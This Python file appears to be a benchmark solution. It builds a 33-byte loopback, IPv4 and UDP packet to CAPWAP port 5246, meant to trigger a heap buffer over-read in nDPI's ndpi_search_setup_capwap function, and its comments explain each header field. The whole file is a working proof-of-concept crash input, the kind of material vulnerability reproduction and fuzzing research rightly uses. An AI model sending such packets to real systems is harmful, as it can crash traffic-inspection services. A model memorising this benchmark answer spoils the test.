import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in ndpi_search_setup_capwap.
        
        The vulnerability corresponds to OSS-Fuzz issue 21000. It is a heap-buffer-overflow (read)
        caused by accessing capwap_header[1] without checking if the payload length is sufficient.
        The crash happens when payload starts with \x00 but is less than 2 bytes long.
        
        Ground-truth length 33 implies a DLT_NULL (Loopback) frame:
        4 bytes (Loopback) + 20 bytes (IP) + 8 bytes (UDP) + 1 byte (Payload) = 33 bytes.
        """
        
        # 1. Loopback Header (4 bytes)
        # Family AF_INET = 2. Little Endian standard for many fuzzers.
        dl_header = b'\x02\x00\x00\x00'
        
        # 2. IP Header (20 bytes)
        # Version/IHL: 0x45 (IPv4, 20 bytes)
        # TOS: 0x00
        # Total Length: 29 bytes (0x001d) -> 20 IP + 8 UDP + 1 Payload
        # ID: 0x0000
        # Flags/Frag: 0x0000
        # TTL: 0x40
        # Protocol: 0x11 (UDP)
        # Checksum: 0x0000 (Ignored by nDPI usually)
        # Src IP: 127.0.0.1
        # Dst IP: 127.0.0.1
        ip_header = b'\x45\x00\x00\x1d\x00\x00\x00\x00\x40\x11\x00\x00\x7f\x00\x00\x01\x7f\x00\x00\x01'
        
        # 3. UDP Header (8 bytes)
        # Src Port: 0
        # Dst Port: 5246 (0x147e) - CAPWAP Control
        # Length: 9 bytes (0x0009) - 8 Header + 1 Payload
        # Checksum: 0
        udp_header = b'\x00\x00\x14\x7e\x00\x09\x00\x00'
        
        # 4. Payload (1 byte)
        # Must be \x00 to satisfy the first condition `if (header[0] == 0 ...)`
        # The subsequent check for `header[1]` causes the OOB read.
        payload = b'\x00'
        
        return dl_header + ip_header + udp_header + payload